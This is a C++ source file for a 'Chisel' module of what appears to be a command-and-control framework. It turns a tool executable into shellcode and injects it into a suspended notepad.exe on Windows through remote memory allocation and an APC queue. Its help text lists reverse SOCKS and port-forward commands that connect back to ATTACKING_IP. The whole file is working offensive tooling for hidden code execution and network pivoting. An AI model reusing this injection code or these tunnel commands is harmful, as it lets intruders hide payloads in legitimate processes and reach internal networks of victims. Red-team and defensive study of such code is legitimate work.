#include "Chisel.hpp"

#include <cstring>
#include "Tools.hpp"


using namespace std;

const std::string moduleName = "chisel";
const std::string ToolsDirectoryFromTeamServer = "../Tools/";


#define BUFSIZE 512

#ifdef _WIN32

__declspec(dllexport) Chisel* A_ChiselConstructor() 
{
    return new Chisel();
}

#endif

Chisel::Chisel()
	: ModuleCmd(moduleName)
{
}

Chisel::~Chisel()
{
}

std::string Chisel::getInfo()
{
	std::string info;
	info += "Chisel:\n";
	info += "Launch chisel in a thread on the remote server.\n";
	info += "No output is provided.\n";
	info += "exemple:\n";
	info += "- chisel status\n";
	info += "- chisel stop pid\n";
	info += "Reverse Socks Proxy:\n";
	info += "- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:socks\n";
	info += "- On the attacking machine: chisel server -p LISTEN_PORT --reverse\n";
	info += "Remote Port Forward:\n";
	info += "- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:REMOT_PORT\n";
	info += "- On the attacking machine: chisel server -p LISTEN_PORT --reverse\n";

	return info;
}

int Chisel::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
	if (splitedCmd.size() == 2)
	{
		if(splitedCmd[1]=="status")
		{
			std::string msg;
			for(int i=0; i<m_instances.size(); i++)
			{
				msg+="pid ";
				msg+=std::to_string(m_instances[i].first);
				msg+=",  ";
				msg+=m_instances[i].second;
				msg+="\n";
			}
			c2Message.set_returnvalue(msg);
			return -1;
		}
		else
		{
			c2Message.set_returnvalue(getInfo());
			return -1;
		}
	}
	else if (splitedCmd.size() == 3)
	{
		if(splitedCmd[1]=="stop")
		{
			int pid=-1;
			try 
			{
				pid = atoi(splitedCmd[2].c_str());
			}
			catch (const std::invalid_argument& ia) 
			{
				c2Message.set_returnvalue(getInfo());
				return -1;
			}

			c2Message.set_instruction(splitedCmd[0]);
			c2Message.set_pid(pid);
			c2Message.set_cmd("stop");
		}
		else
		{
			c2Message.set_returnvalue(getInfo());
			return -1;
		}
	}
	else if (splitedCmd.size() == 5)
	{
		std::string inputFile=splitedCmd[1];
		std::string args;

		for (int idx = 2; idx < splitedCmd.size(); idx++) 
		{
			if(!args.empty())
				args+=" ";
			args+=splitedCmd[idx];
		}

		if(inputFile.empty())
		{
			std::string msg = "A file name have to be provided.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		std::ifstream myfile;
		myfile.open(inputFile);

		if(!myfile)
		{
			std::string newInputFile=ToolsDirectoryFromTeamServer;
			newInputFile+=inputFile;
			myfile.open(newInputFile, std::ios::binary);
			inputFile=newInputFile;
		}

		if(!myfile) 
		{
			std::string msg = "Couldn't open file.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}
		myfile.close();

		std::string method;
		std::string payload;
		creatShellCodeDonut(inputFile, method, args, payload);

		if(payload.size()==0)
		{
			std::string msg = "Something went wrong. Payload empty.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_cmd(args);
		c2Message.set_data(payload.data(), payload.size());
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	return 0;
}


int Chisel::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	const std::string payload = c2Message.data();

	std::string result;
	int pid=-1;

#ifdef __linux__
#elif _WIN32

	if(c2Message.cmd()=="stop")
	{
		pid = c2Message.pid();
		HANDLE hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
		TerminateProcess(hProc,9);

		c2RetMessage.set_instruction(m_name);
		c2RetMessage.set_pid(pid);
		c2RetMessage.set_cmd("stop");

		result="Chisel stoped.\n";
		c2RetMessage.set_returnvalue(result);
		return 0;
	}

	STARTUPINFO si;
 	PROCESS_INFORMATION pi;

 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));

	TCHAR szCmdline[] = TEXT("notepad.exe");
 	if (CreateProcess(NULL, szCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
 	{
 		PVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
 		WriteProcessMemory(pi.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
 		DWORD oldprotect = 0;
 		VirtualProtectEx(pi.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
 		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
 		QueueUserAPC((PAPCFUNC)apcRoutine, pi.hThread, NULL);
 		ResumeThread(pi.hThread);

		pid=pi.dwProcessId;
		result = "Start chisel on pid ";
		result += std::to_string(pid);
		result += "\n";
	}
	else
	{
	 	result += "CreateProcess failed.";
	}

#endif

	c2RetMessage.set_instruction(m_name);
	c2RetMessage.set_pid(pid);
	c2RetMessage.set_cmd(c2Message.cmd());
	c2RetMessage.set_returnvalue(result);

	return 0;
}

int Chisel::followUp(const C2Message &c2RetMessage)
{
	int pid = c2RetMessage.pid();
	if(pid!=-1)
	{	
		if(c2RetMessage.cmd()=="stop")
		{
			auto it = m_instances.begin();
			while(it != m_instances.end()) 
			{
				std::cout << (*it).first << std::endl;
				if((*it).first == pid) 
				{
					it = m_instances.erase(it);
				} 
				else 
				{
					it++;
				}
			}
		}
		else
		{
			std::pair<int, std::string> inst;
			inst.first = pid;
			inst.second = c2RetMessage.cmd();
			m_instances.push_back(inst);
		}
	}

	return 0;
}
